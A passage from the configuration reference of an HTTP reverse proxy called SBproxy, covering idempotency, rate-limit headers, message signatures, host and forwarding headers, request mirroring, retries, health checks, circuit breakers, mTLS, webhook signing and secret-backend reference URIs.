| `max_concurrent_buffers` | int | 256 | Per-origin cap on concurrent buffered requests, and separately on requests waiting for another request's claim. The two pools answer a full pool differently, deliberately: a full **buffering** pool skips the cache and the request goes upstream uncached, carrying `x-sbproxy-idempotency: SKIPPED-POOL-FULL`; a full **waiter** pool answers 409 `ledger.idempotency_in_flight` with `x-sbproxy-idempotency: IN-FLIGHT` and `Retry-After: 1` immediately, because a request that cannot wait for the holder must not be allowed upstream to duplicate the side effect. Worst-case memory per origin is roughly `2 * max_concurrent_buffers * max_request_body_bytes`. |
| `claim_lease_secs` | int | 60 | How long the request holding a key keeps it before another may take it over. The bound on how long one crashed request can wedge one key. Raise it above the slowest response this origin produces. `0` is refused at config-load time. |
| `claim_wait_ms` | int | 3000 | How long an overlapping request waits for the holder's response before answering 409 `ledger.idempotency_in_flight`. `0` answers 409 immediately, which is the floor the draft describes. |

The `memory` backend is per-origin and per-replica: suitable for
single-instance deployments and clusters with sticky routing. The
`redis` backend binds at config-compile time to the cluster L2 store
configured under `proxy.l2_cache_settings` (alias `l2_cache`); an
origin asking for `redis` without that block surfaces a clear
config-load error rather than silently downgrading.

See [`examples/idempotency/`](https://github.com/soapbucket/sbproxy/tree/main/examples/idempotency).

Spec: <https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/>.

> **AI gateway note.** The AI proxy path (`action: ai_proxy`) engages
> the same middleware: when the origin has an `idempotency:` block,
> AI requests get the same cached-replay, conflict, and skip semantics
> as plain proxy traffic.

---

## Rate limit headers

Rate-limit headers are configured on the limiting policy's own `headers` block: the policy that counts the requests is the one that knows the limit, the remaining budget, and the reset time. Two policies emit them, in two different shapes, and neither reads the other's block.

```yaml
origins:
  "api.example.com":
    policies:
      - type: rate_limiting
        requests_per_minute: 600
        headers:
          enabled: true
          include_retry_after: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `headers.enabled` | bool | false | When true, emit `X-RateLimit-Limit`, `X-RateLimit-Remaining`, and `X-RateLimit-Reset` on responses. |
| `headers.include_retry_after` | bool | false | When true, emit `Retry-After` on 429 responses. |

The origin-level `rate_limit_headers:` block has been removed. It parsed but was never consumed, so a config that still carries it fails config compile with a pointer at the policy-level block above. Delete the origin-level block and move the settings onto the policy.

`rate_limit_budget`, the workspace-wide budget policy documented in
[policy.md](policy.md), carries its own `headers` block instead of reading
this one, and emits the newer `draft-ietf-httpapi-ratelimit-headers` /
RFC 9239 shape on a 429: `RateLimit-Limit`, `RateLimit-Remaining`,
`RateLimit-Reset`, and, when `headers.include_ratelimit_policy` is true
(the default), `RateLimit-Policy`. See
[headers-reference.md](headers-reference.md#response-headers-the-proxy-emits)
for both header sets side by side.

---

## Message signatures

The `message_signatures` block configures RFC 9421 HTTP Message Signature verification for an origin. Verification is wired into the request pipeline: with `verify: true`, every inbound request must carry a `Signature-Input` + `Signature` header pair that matches the configured `key_id`, or it is rejected with `401 Unauthorized` and `WWW-Authenticate: Signature` before any downstream auth provider runs.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    message_signatures:
      verify: true
      algorithm: hmac_sha256
      key_id: proxy-key-1
      key: ${SIGNING_SHARED_SECRET}
      required_components:
        - "@method"
        - "@target-uri"
        - content-digest
      clock_skew_seconds: 30
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `verify` | bool | false | When true, enforce signature verification on inbound requests to this origin. |
| `algorithm` | string | required | Signature algorithm: `hmac_sha256`, `ed25519`, or `ecdsa_p256_sha256`. An unrecognized value rejects all requests to the origin rather than silently bypassing the gate. |
| `key_id` | string | required | The `keyid` value the signer is expected to advertise in `Signature-Input`. |
| `key` | string | required | Verification key material, or a reference to it. For `hmac_sha256`, the shared secret; for `ed25519`, the hex- or base64-encoded raw 32-byte public key; for `ecdsa_p256_sha256`, the hex- or base64-encoded uncompressed SEC1 public point (65 bytes starting with `04`). Accepts every reference form the [secrets guide](secrets.md#reference-forms) defines, resolved before the value is decoded, so a stored secret yields the same key bytes as that value written inline. A reference that no declared backend can resolve rejects every request to the origin rather than becoming the key. |
| `required_components` | list | `[]` | Canonical components every accepted signature must cover, e.g. `@method`, `@target-uri`, `content-digest`. A signature covering a strict subset is rejected. |
| `clock_skew_seconds` | int | 30 | Tolerance applied to the signature's `created` / `expires` timestamps. |

### Algorithms

The `alg` parameter on the wire has to be present and has to name the configured algorithm. A signature that omits `alg` is rejected: without that rule, dropping the parameter would sidestep the pin and let a signature through whichever crypto path the verifier defaulted to.

| Config value | RFC 9421 registry name | Key format |
|---|---|---|
| `hmac_sha256` | `hmac-sha256` | Shared secret. Hex or base64 if your keying flow encodes it, otherwise raw bytes. |
| `ed25519` | `ed25519` | Raw 32-byte public key, hex or base64. |
| `ecdsa_p256_sha256` | `ecdsa-p256-sha256` | Uncompressed SEC1 public point, 65 bytes starting with `04`, hex or base64. |

Two shapes of P-256 key are refused at startup instead of failing every request later: a compressed point (33 bytes starting with `02` or `03`) and a DER or SPKI wrapper. Convert either to the uncompressed point first. The signature itself must be the fixed-width `r || s` form the registry specifies, 64 bytes; a DER-encoded signature is rejected and says so in the log.

RSA-PSS-SHA512, RSA-v1_5-SHA256, and ECDSA-P384-SHA384 are not implemented. Signing outbound requests is Ed25519 and HMAC only.

### Body coverage

`content-digest` is an ordinary header reference as far as the signature base is concerned, so the cryptography binds the digest value and nothing else. When a signature covers `content-digest`, the proxy also buffers the request body, recomputes the digest, and rejects the request if the two disagree. Without that second step a valid signature would keep verifying over a body someone swapped underneath it.

The body is only buffered for a request whose `Signature-Input` names `content-digest`. A signature over headers alone costs nothing extra, and neither does an origin that verifies no signatures at all.

Buffering is bounded by the 64 KiB replay buffer, the same ceiling GraphQL request validation works under. A body over that limit is rejected with `401`, not `413`: the request is not too large to serve, it is too large to prove, and letting it through would defeat the coverage the signer asked for. Keep body-covering signatures to small request payloads, or cover headers only.

`repr-digest` is not checked against the body. Cover `content-digest` when you want the body bound.

---

## Traffic capture

The `traffic_capture` block is not supported, and a config that sets it
fails to load.

Nothing ever read it. It was also accepted as a free-form value rather
than a typed block, so nothing validated its contents either: a
misspelled field inside it looked exactly like a working setting. The
block still parses, so the failure names the replacement instead of
reading as an unknown key.

For shadow traffic that is wired into the request path, use
[`mirror`](#request-mirror), which forwards a fire-and-forget copy of
each request to a second upstream without delaying or failing the real
one.

---

## Host header semantics

![A request whose Host header is rewritten before it reaches the upstream, shown by the echoed request](assets/host-override.gif)

([config](../examples/host-override/))

When the proxy forwards a request to an upstream, it controls the upstream `Host` header explicitly:

1. The default is the upstream URL's hostname. So `url: https://api.upstream.com:8443` causes the upstream to see `Host: api.upstream.com:8443`. This works correctly with vhost-routed services like Vercel, Cloudflare-fronted origins, S3 website endpoints, and AWS ALBs out of the box.
2. If the action sets `host_override: <value>`, that value wins.
3. If a request modifier sets `Host`, the modifier takes precedence over both above (it runs after the proxy's default).

Whenever the proxy rewrites `Host` (i.e. the upstream value differs from what the client sent), it also sets `X-Forwarded-Host: <client's original Host>` so the upstream can still observe the public name. Suppress that breadcrumb with `disable_forwarded_host_header: true`.

The same `host_override` field is accepted on every URL-bearing action: `proxy`, each `load_balancer` target, `websocket`, `graphql`, `a2a`, `forward_auth`, and AI provider entries. `grpc` exposes the equivalent control as `authority`, matching the HTTP/2 spec name.

---

## Origin overrides

![An origin dialing a fixed IP with a custom SNI while the client-facing hostname stays unchanged](assets/sni-resolve-override.gif)

([config](../examples/sni-resolve-override/))

Three knobs control how the proxy reaches the upstream, all independent so they compose:

| Field | What it changes | curl analogue |
|-------|-----------------|---------------|
| `host_override` | Upstream `Host` HTTP header | `--header "Host: ..."` |
| `sni_override` | TLS SNI server name (and cert verification target) | `--resolve` (TLS leg) |
| `resolve_override` | Connect address (skips DNS for the URL host) | `--connect-to` |

Common patterns:

**Front a SaaS where the cert hostname differs from the URL host.**

```yaml
action:
  type: proxy
  url: https://api.tenant.example.com
  sni_override: cdn.provider.net           # cert is for *.provider.net
  host_override: api.tenant.example.com    # upstream still expects the tenant hostname
```

**Pin a region without polluting the system resolver.**

```yaml
action:
  type: proxy
  url: https://api.example.com
  resolve_override: 203.0.113.7:443        # eu-west-1 anycast
```

**Stage a cutover by pointing at a candidate IP.**

```yaml
action:
  type: proxy
  url: https://api.example.com
  resolve_override: "[2001:db8::1]:8443"
```

`resolve_override` accepts `ip`, `ip:port`, `[ipv6]:port`, or `host:port`. When the port is omitted, the URL's port is used. The proxy still sends the URL's hostname in the request line; only the connect address changes.

---

## Trusted proxies and forwarding headers

![X-Forwarded-For, X-Forwarded-Proto, and X-Forwarded-Host arriving at the upstream, then suppressed via the disable flags](assets/forwarding-headers.gif)

([config](../examples/forwarding-headers/))

![The client IP resolved from X-Forwarded-For only when the peer is a trusted proxy](assets/trusted-proxies.gif)

([config](../examples/trusted-proxies/))

When SBproxy is itself behind another load balancer or CDN (Cloudflare, AWS ALB, Fly.io, internal LB), the immediate TCP peer is that LB, not the real client. To recover the real client identity safely, configure `proxy.trusted_proxies` with the source ranges of those upstream hops:

```yaml
proxy:
  trusted_proxies:
    - 10.0.0.0/8
    - 2001:db8::/32        # IPv6 supported
```

Behavior:

- If the immediate TCP peer falls inside any trusted CIDR, the proxy parses the inbound `X-Forwarded-For` chain and uses the leftmost untrusted hop as the real client IP. This becomes `ctx.client_ip` for the rest of the request: rate limits, IP filters, audit logs.
- If the immediate TCP peer is **not** trusted, every inbound forwarding header is stripped on ingress. A direct client cannot spoof its source identity by setting `X-Forwarded-For: 1.2.3.4`.

The proxy then sets the standard forwarding headers on every upstream request:

| Header | Set to | Opt-out flag |
|---|---|---|
| `X-Forwarded-Host` | client's original `Host` (when proxy rewrites `Host`) | `disable_forwarded_host_header` |
| `X-Forwarded-For` | client IP appended to existing chain | `disable_forwarded_for_header` |
| `X-Real-IP` | the immediate client IP | `disable_real_ip_header` |
| `X-Forwarded-Proto` | `https` if the listener was TLS, else `http` | `disable_forwarded_proto_header` |
| `X-Forwarded-Port` | the listener port | `disable_forwarded_port_header` |
| `Forwarded` (RFC 7239) | `for=<client>; proto=<scheme>; host=<orig>; by=<proxy>` (IPv6 bracketed per RFC) | `disable_forwarded_header` |
| `Via` | appended `1.1 sbproxy` | `disable_via_header` |

All flags live on the action (or per-target on a load balancer). Default is enabled (no flag set). See [example 73](../examples/trusted-proxies/sb.yml) and [example 74](../examples/forwarding-headers/sb.yml).

---

## Request mirror

![Production traffic answered by the primary while a copy of each request arrives at the mirror upstream](assets/request-mirror.gif)

([config](../examples/request-mirror/))

Send a fire-and-forget copy of every matched request to a shadow upstream. The mirror response is read and discarded; the client only ever sees the primary's response. Useful for safe rollouts of new backends, replay-style testing, and capturing production traffic patterns without affecting end-users.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://primary.internal:8080
    mirror:
      url: https://shadow.internal:8080
      sample_rate: 0.1       # mirror ~10% of requests; default 1.0
      timeout_ms: 5000       # mirror request timeout; default 5000
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Mirror upstream URL. IPv6 hosts must be bracketed (`http://[2001:db8::1]:8080`). |
| `sample_rate` | float | `1.0` | Probability in `[0.0, 1.0]` that a given request is mirrored. |
| `timeout_ms` | int | `5000` | Per-mirror request timeout. Independent of the primary upstream timeout. |
| `mirror_body` | bool | `false` | Tee the inbound request body into the mirror request. Off by default, mirror sees only method, path, query, and headers (sufficient for read endpoints; safe for any case where shadow-replaying writes is unsafe). Set `true` to shadow-replay POST/PUT/PATCH endpoints during migrations. |
| `max_body_bytes` | int | `1048576` | Body size cap (bytes). Bodies larger than this fire the mirror without a body so a single large upload can't blow up proxy memory. Defaults to 1 MiB. |

Mirror requests carry `X-Sbproxy-Mirror: 1` and the original `X-Sbproxy-Request-Id` so the shadow upstream can distinguish them from real traffic. Method, path/query, and headers are mirrored. Request bodies are mirrored only when `mirror_body: true`; bodies larger than `max_body_bytes` fire the mirror without a body so large uploads do not grow proxy memory unbounded. Hop-by-hop headers and `Host` are not forwarded, and `reqwest` rebuilds `Host` from the mirror URL.

See [example 75](../examples/request-mirror/sb.yml).

---

## Upstream retries

When an upstream connection fails (TCP refused, DNS failure, TLS handshake error, or connect timeout), when an established upstream connection hits a read or write deadline, or when an upstream response returns a configured status code, the proxy can retry the request automatically.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: http://backend.internal:8080
      retry:
        max_attempts: 3
        retry_on:
          - connect_error
          - timeout
          - 502
          - 503
        backoff_ms: 100
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `max_attempts` | int | `1` | Total request attempts including the original. `0` or `1` disables retries. Values above `16` are rejected at config load: the proxy loop never runs more tries than that. |
| `retry_on` | array | `[connect_error, timeout]` | Retry conditions. Recognized values are `connect_error` (any failure establishing the upstream connection), `timeout` (a connect-phase deadline, or a read/write deadline on the established connection), and numeric upstream status codes in `100..=599` such as `502` or `503`. Status codes may be written as YAML numbers or strings. Any other entry, and an explicitly empty list, is rejected at config load instead of silently never matching. |
| `backoff_ms` | int | `100` | Base backoff before the next attempt. Doubles on each retry, capped at 5000ms. |

`retry` is accepted on both `proxy` and `load_balancer` actions. Connect-error, timeout, and status-code retries share one attempt counter, so a mixed failure sequence is capped at `max_attempts` total attempts. When every attempt is exhausted, the last upstream response (or transport error) is what the client sees, untouched.

Timeout retries cover two phases. A connect-phase deadline (TCP connect or TLS handshake) retries when `retry_on` lists either `connect_error` or `timeout`: a connect timeout is both a connect error and a timeout, so either token enables it. A read or write deadline hit after the connection was established retries only under the `timeout` token, and only while the response has not started: once any response byte has been written toward the client, nothing can be recalled, so the timeout surfaces as an error instead. Because an established-connection timeout means the request already reached the upstream, these retries also apply the same replay rules as status-code retries below: safe or idempotent methods only, with a request body the retry buffer can replay in full. Connect-phase retries carry no such method gate, because the request was never sent.

Status-code retries are decided after upstream response headers arrive and before any downstream response headers are written. The proxy only replays methods that are safe or idempotent by HTTP semantics: `GET`, `HEAD`, `OPTIONS`, `TRACE`, `PUT`, and `DELETE`. A request with a body is replayed only after the downstream body has fully arrived and Pingora's retry buffer still contains the full body; the buffer is Pingora machinery, not something the proxy re-implements, and a body it cannot replay is never retried. Non-idempotent methods such as `POST` and `PATCH`, still-streaming bodies, and bodies larger than the retry buffer pass through unchanged. When a configured status retry is skipped, the response carries `x-sbproxy-retry-skip-reason` with one of `non_idempotent_method`, `streaming_body`, `body_too_large`, `body_unavailable`, or `max_attempts_exhausted`.

Choosing which statuses to retry is the operator's risk call, and the method gate above does not remove it: a `PUT` is idempotent in HTTP semantics but a billing webhook behind it may not be. A `503` usually means the upstream refused the request before doing any work, which makes it the safest status to retry. `502` and `504` are ambiguous: the upstream (or an intermediary in front of it) may have processed the request before the response was lost. List a status only when replaying a processed request is acceptable for that origin.

For `load_balancer` actions, whether a retry lands on a different target depends on the algorithm:

- `round_robin` advances its counter on every selection, so a retry naturally moves to the next target even with no health machinery configured.
- `weighted_random` draws independently on each attempt; the retry may pick the failed target again by chance.
- `least_connections` re-ranks by current connection counts; the failed target can win again.
- `ip_hash`, `uri_hash`, `header_hash`, and `cookie_hash` are deterministic over the eligible target list, so a retry re-selects the same target until something shrinks that list.

Independently of the algorithm, a failed attempt is reported to the outlier detector and the per-target circuit breaker when those are configured on the action. Once a target crosses the detector's ejection threshold (or its breaker opens), it drops out of the eligible list and every algorithm, including the hash-based ones, re-maps to a surviving target. Without outlier detection or circuit breakers configured, hash-based algorithms retry the same dead target; pair status retries with those features (or active health checks) if that matters for your topology.

Each status-triggered retry increments `sbproxy_upstream_status_retries_total{origin, status}` at decision time. Skipped matches do not count; they surface through `x-sbproxy-retry-skip-reason` instead. Each retry of a timed-out attempt increments `sbproxy_upstream_timeout_retries_total{origin, phase}`, where `phase` is `connect` for connection-establishment deadlines and `upstream` for read/write deadlines on the established connection; timeouts that are not retried do not count.

See [example 76](../examples/upstream-retries/sb.yml) for the combined connect + status story, and [retry-on-status](../examples/retry-on-status/sb.yml) for status-code retries across a two-target load balancer.

---

## Active health checks

Configure background probes per `load_balancer` target. The proxy GETs the probe URL on a fixed interval and tracks consecutive success / failure counts. Targets that fail the threshold are excluded from `select_target` until they recover. Probe results also feed the outlier detector when one is configured, so passive and active signals share state.

```yaml
action:
  type: load_balancer
  targets:
    - url: http://backend-1.internal:8080
      health_check:
        path: /healthz
        interval_secs: 10        # probe period in seconds
        timeout_ms: 2000
        unhealthy_threshold: 3
        healthy_threshold: 2
    - url: http://[2001:db8::1]:8080
      health_check:
        path: /healthz
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `path` | string | `/healthz` | Path to probe. Must start with `/`. |
| `interval_secs` | int | `10` | Probe period in seconds (alias: `period_secs`). |
| `timeout_ms` | int | `2000` | Per-probe timeout. |
| `unhealthy_threshold` | int | `3` | Consecutive failures required to mark unhealthy. |
| `healthy_threshold` | int | `2` | Consecutive successes required to recover. |

IPv6 targets are supported: the URL builder preserves bracketing. See [example 77](../examples/active-health-checks/sb.yml).

---

## Circuit breaker

A formal Closed → Open → HalfOpen → Closed state machine attached to each `load_balancer` target. On `failure_threshold` consecutive failures (5xx response, connect error, timeout) the breaker trips Open; every subsequent request to that target is excluded from `select_target` and routed to a healthy peer instead. After `open_duration_secs`, the breaker enters HalfOpen and admits one probe request at a time: the request that takes the probe slot is dispatched, everything else is refused as if the breaker were still Open, and the slot comes back when that probe succeeds or fails. On `success_threshold` consecutive successes it closes again, otherwise it re-opens. Recovery therefore takes `success_threshold` sequential probes rather than one concurrent burst; raise `success_threshold` if you want a recovering upstream warmed more before it is trusted, not concurrency.

```yaml
action:
  type: load_balancer
  circuit_breaker:
    failure_threshold: 5         # trip after 5 consecutive failures
    success_threshold: 2         # close after 2 consecutive HalfOpen successes
    open_duration_secs: 30       # stay Open for 30s before trying a probe
  targets:
    - url: http://backend-1.internal:8080
    - url: http://backend-2.internal:8080
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `failure_threshold` | int | `5` | Consecutive failures before tripping Open. |
| `success_threshold` | int | `2` | Consecutive successes in HalfOpen to return to Closed. |
| `open_duration_secs` | int | `30` | How long the breaker stays Open before admitting a probe. Also how long an admitted probe whose caller never reported an outcome is waited out before the slot is written off and a fresh probe goes through. |

The breaker is **complementary to** [outlier detection](#outlier-detection):

| Signal | Trigger |
|---|---|
| Circuit breaker | `N` failures in a row, immediate isolation |
| Outlier detection | Failure *rate* over a sliding window |

Either signal independently ejects a target from `select_target`. Configure both: outlier detection catches "this target is bad in aggregate," and the breaker catches "this target is hard down right now." When every target is tripped, the LB falls back to the unfiltered list rather than 502'ing the client.

See [example 84](../examples/circuit-breaker/sb.yml).

---

## Outlier detection

Track each `load_balancer` target's success/failure rate over a sliding window and eject targets whose error rate crosses the threshold. Failures are recorded from upstream 5xx responses and from connect errors; recovery happens automatically after the cooldown.

```yaml
action:
  type: load_balancer
  outlier_detection:
    threshold: 0.5              # 50% error rate
    window_secs: 60             # sliding window length
    min_requests: 5             # minimum requests in window before ejection
    ejection_duration_secs: 30  # cooldown before re-admission
  targets:
    - url: http://backend-1.internal:8080
    - url: http://backend-2.internal:8080
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `threshold` | float | `0.5` | Failure rate at which to eject (0.0-1.0). |
| `window_secs` | int | `60` | Sliding window length in seconds. |
| `min_requests` | int | `5` | Minimum requests in the window before ejection is considered. |
| `ejection_duration_secs` | int | `30` | How long to keep an ejected target out of rotation. |

When all active targets are ejected, the proxy falls back to the unfiltered list rather than 502'ing the client (better to send to a flaky peer than to fail closed). See [example 78](../examples/outlier-detection/sb.yml).

---

## Service discovery

Without service discovery, the proxy resolves an upstream hostname once when a connection is established and the connection pool reuses that connection (and that IP) for as long as the connection lives. When the upstream's IP set changes, K8s `Service` endpoints rotate, ECS Cloud Map adds a new task, the backend behind a `Headless` service scales horizontally, the proxy keeps using the stale IP until the connection eventually closes.

`service_discovery` on a `proxy` action makes the proxy re-resolve the hostname every `refresh_secs` and rotate the chosen upstream IP across the current A/AAAA record set.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.namespace.svc.cluster.local:8080
      service_discovery:
        enabled: true
        refresh_secs: 30        # default
        ipv6: true              # default; drop to false to skip AAAA
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `true` | Master switch. The presence of the block usually means "I want it on"; set `false` to keep the config without enabling. |
| `refresh_secs` | int | `30` | How often to re-resolve. Setting this below the upstream record's actual TTL has no effect, the system resolver applies its own caching, but the proxy will at least notice changes within `refresh_secs` of the upstream-side update. |
| `ipv6` | bool | `true` | Whether AAAA records contribute to the rotation set. |

The hostname stays as the SNI / `Host` header so TLS verification continues to match the certificate that was issued for the hostname. IPv6 resolved addresses are wrapped in brackets (`[2001:db8::1]:port`) when handed to Pingora. Round-robin selection within the resolved set spreads load across all current IPs.

When DNS resolution fails (network glitch, hostname temporarily NXDOMAIN), the proxy falls back to letting Pingora's connect-time resolver handle the lookup.

See [example 83](../examples/service-discovery/sb.yml).

---

## Correlation ID

The proxy mints a per-request correlation identifier early in the request lifecycle. With the default policy:

1. If the inbound request carries `X-Request-Id`, its value becomes the request's correlation ID. Upstream callers (a frontend, an API client, another proxy) get to thread their traces through ours.
2. Otherwise the proxy generates a fresh UUID v4 (32 hex chars).
3. The chosen value is set on the upstream request under the same header name so the upstream sees the same ID the proxy logged.
4. The chosen value is echoed back to the client on the response, so the client can hand it to support to find the matching server logs.

```yaml
proxy:
  correlation_id:
    enabled: true              # default
    header: X-Request-Id       # default; rename for shops that use X-Correlation-Id
    echo_response: true        # default; set false to omit the response header
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `true` | Master switch. |
| `header` | string | `X-Request-Id` | Header name read on ingress, set on the upstream, and echoed on the response. |
| `echo_response` | bool | `true` | Whether to set the header on the downstream response. |

The same value is exposed as `ctx.request_id` to every other component: webhook envelopes (`X-Sbproxy-Request-Id`), access logs, alert webhooks, and the AI gateway's per-call records. Set `enabled: false` to opt out entirely.

Inbound values longer than 256 characters are ignored (the proxy generates a fresh ID). Empty / whitespace-only inbound values are ignored.

See [example 80](../examples/correlation-id/sb.yml).

---

## mTLS client authentication

When set, the HTTPS listener requires (or optionally accepts) a client TLS certificate signed by the configured CA bundle. The verification happens during the TLS handshake, clients without a valid cert are rejected before `request_filter` ever runs.

```yaml
proxy:
  http_bind_port: 8080
  https_bind_port: 8443
  tls_cert_file: /etc/ssl/sbproxy/server.pem
  tls_key_file: /etc/ssl/sbproxy/server.key
  mtls:
    client_ca_file: /etc/ssl/sbproxy/clients-ca.pem
    require: true              # default; set false to allow anonymous TLS clients
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `client_ca_file` | string | required | PEM-encoded CA bundle used to verify client certs. May contain multiple `BEGIN CERTIFICATE` blocks; each becomes a trust anchor. |
| `require` | bool | `true` | When `true`, the handshake fails if the client does not present a certificate. When `false`, anonymous clients are admitted and the upstream sees no `X-Client-Cert-*` headers (so it can choose its own policy). |

After a successful handshake, the proxy strips any inbound `X-Client-Cert-*` headers (so a non-TLS client cannot forge them) and sets the verified cert metadata for the upstream:

| Header | Value |
|---|---|
| `X-Client-Cert-Verified` | `1` |
| `X-Client-Cert-CN` | Subject Common Name, when present |
| `X-Client-Cert-SAN` | Comma-separated `DNS:`/`URI:`/`email:`/`IP:` SANs |
| `X-Client-Cert-Organization` | Subject's `O` field, when present |
| `X-Client-Cert-Serial` | hex serial number |
| `X-Client-Cert-Fingerprint` | hex SHA-256 of the cert |

CN and SAN are extracted by a wrapping `ClientCertVerifier` that captures them at handshake time and indexes by SHA-256 of the cert DER (which matches Pingora's internal `cert_digest`). Chain validation is unchanged. The cache is bounded so a churning client population does not grow it without bound.

See [example 85](../examples/mtls-client-auth/sb.yml).

---

## Webhook envelope and signing

Every webhook the proxy fires (`on_request`, `on_response`, alerting channels) carries a standard identifying envelope and optional HMAC-SHA256 signature.

### Envelope

```json
{
  "event": "on_request",
  "proxy": {
    "instance_id": "sbproxy-host-7c4d8b9a",
    "version": "0.1.0",
    "config_revision": "a7b3f9c11d80"
  },
  "request": {
    "id": "01j9x4af1k73c5dvkk1xvb6f9w",
    "received_at": "2026-04-25T07:32:00Z"
  },
  "origin": { "name": "api.example.com" },
  "method": "GET",
  "path": "/api/users",
  "host": "api.example.com",
  "client_ip": "203.0.113.7",
  "headers": { "...": "..." }
}
```

`on_response` payloads include the same `proxy.*` and `request.id` fields, plus `status` and `duration_ms`, so receivers can correlate the request/response pair.

### Headers on the webhook request

| Header | Value |
|---|---|
| `User-Agent` | `sbproxy/<version>` |
| `X-Sbproxy-Event` | `on_request`, `on_response`, or `alert` |
| `X-Sbproxy-Instance` | per-process instance identifier |
| `X-Sbproxy-Request-Id` | matches `request.id` in the envelope |
| `X-Sbproxy-Config-Revision` | short hex hash of the loaded config |
| `X-Sbproxy-Timestamp` | unix seconds at send time |
| `X-Sbproxy-Signature` | `v1=<hex>` (only when `secret` is configured) |

### Signing

Set a `secret` on the callback to enable HMAC-SHA256:

```yaml
on_request:
  - url: https://hooks.example.com/sbproxy
    method: POST
    secret: shared-webhook-secret
    timeout: 5
```

The signed material is `"<timestamp>.<body>"`. Receivers should:

1. Read `X-Sbproxy-Timestamp` and reject anything older than ~5 minutes (replay defense).
2. Compute `HMAC-SHA256(secret, timestamp + "." + raw_body)`.
3. Compare to `X-Sbproxy-Signature` (`v1=<hex>`) using a constant-time comparison.

Alert webhook channels (`proxy.alerting.channels[]`) do not accept a `secret` field; a channel entry takes only `type`, `url`, and `headers`, and anything else is rejected at config load. Alert-payload signing is not configurable yet. See [example 79](../examples/webhook-signing/sb.yml).

---

## Secrets

The live surface is the named-backend list under
`proxy.secrets.backends`. Provider URI references select a backend by name and
fail startup if they cannot be resolved:

```yaml
proxy:
  secrets:
    backends:
      - type: hashicorp
        name: primary
        addr: https://vault.example.com
        mount: secret
        auth:
          type: token
          token: ${VAULT_TOKEN}

origins:
  "ai.example.com":
    action:
      type: ai_proxy
      providers:
        - name: openai
          api_key: vault://primary/apps/openai?key=api_key
```

The legacy `proxy.secrets.backend`, `hashicorp`, `map`, and `fallback` keys are
config-only compatibility fields. They do not select a backend or change failure
behavior. Use [the named-backend guide](secrets.md) for every supported backend
and URI shape.

### Secret rotation

`proxy.secrets.rotation` governs a credential that sbproxy resolves from a
backend and then presents to an upstream.

| Key | Type | Default | Description |
|---|---|---|---|
| `re_resolve_interval_secs` | int | `60` | How long a resolved credential is served before the backend is consulted again. Lower picks up a rotated secret sooner and calls the backend more often. |
| `grace_period_secs` | int | `0` | How long past that window a credential may still be served, and only when re-resolution has actually failed. `0` disables it. |

```yaml
proxy:
  secrets:
    rotation:
      re_resolve_interval_secs: 60
      grace_period_secs: 300
```

`grace_period_secs` buys availability, not credential overlap. sbproxy presents
upstream credentials rather than validating them, so it has no old-value
acceptance window to honor; that belongs to the secret provider, and every
supported backend already does it (AWS Secrets Manager keeps `AWSPREVIOUS`
valid, Vault keeps the old lease alive until revocation). What the grace window
prevents is a briefly unreachable backend turning every request that carries a
bound credential into a `503` when a good value was resolved seconds earlier.

Two things it deliberately does not cover. A credential that was **deleted or
revoked** is not served out of the grace window, because that would turn a
revocation into a window where the credential still works. And an admin
mutation drops the cached value immediately, so an operator-driven rotation
takes effect on the next request regardless of the interval.

Both keys are process-owned. A reload that changes them is refused with a
restart message, for the same reason the rest of `proxy.secrets` is.

The `extensions` map at both the proxy and the origin level holds opaque blocks consumed by out-of-tree crates. The proxy does not parse them.

### Secret reference URI schemes

In addition to `${ENV}`, `file:`, and `secret:`, secret-bearing fields accept provider-specific secret reference URIs. The scheme names the provider type, the authority names the configured backend instance, and the path is interpreted by that provider.

#### Grammar

```
<scheme>://<backend-name>/<provider-path>[?version=<n>][&key=<json-field>]
```

| Scheme | Provider type | Example |
|---|---|---|
| `vault://` | HashiCorp Vault KV | `vault://primary/secret/data/openai-prod?key=api_key` |
| `awssm://` | AWS Secrets Manager | `awssm://primary/openai-keys?version=3&key=api_key` |
| `gcpsm://` | GCP Secret Manager | `gcpsm://primary/openai-api-key?version=latest` |
| `azurekv://` | Azure Key Vault | `azurekv://primary/openai-api-key?version=6a2b45c8f9e14e0d` |
| `k8ssecret://` | Kubernetes Secret | `k8ssecret://primary/sbproxy-secrets/openai-key` |
| `secretfile://` | Local YAML or JSON secret file | `secretfile://local/openai-prod?key=api_key` |
| `secret://` | Local static secret map | `secret://local/openai-prod` |

* `<backend-name>` is the operator-chosen backend instance name declared under `proxy.secrets.backends:`.
* `<provider-path>` is the backend-specific path. The parser carries it verbatim; each backend validates its own shape at resolve time.
* `version=<n>` pins a secret version where the backend supports versioning, such as HashiCorp KV v2, AWS Secrets Manager, GCP Secret Manager, or Azure Key Vault. It is ignored by versionless backends.
* `key=<json-field>` extracts a sub-field from a JSON secret payload. When omitted the entire payload is returned.
* Additional query parameters carry through to the backend as opaque hints; the parser does not interpret them.

#### Examples

```yaml
authentication:
  type: bearer
  tokens:
    - vault://primary/secret/data/openai-prod?key=api_key
    - awssm://primary/prod/openai-keys?version=3&key=api_key
    - gcpsm://primary/openai-api-key?version=latest
    - azurekv://primary/openai-api-key?version=6a2b45c8f9e14e0d
    - k8ssecret://primary/sbproxy-secrets/openai-key
    - secretfile://local/openai-prod?key=api_key
    - secret://local/openai-prod
    - ${OPENAI_API_KEY}
```

#### Backward compatibility

Existing `${ENV}` and `file:/path/to/secret` shapes keep working unchanged. The Go-era `secret:<name>` colon form is removed and fails config load with a pointer at the `secret://<backend>/<name>` replacement. Legacy umbrella references shaped as `vault://<alias>/...` are still accepted with a warning as of SBproxy 1.5.0; a removal release has not been announced.

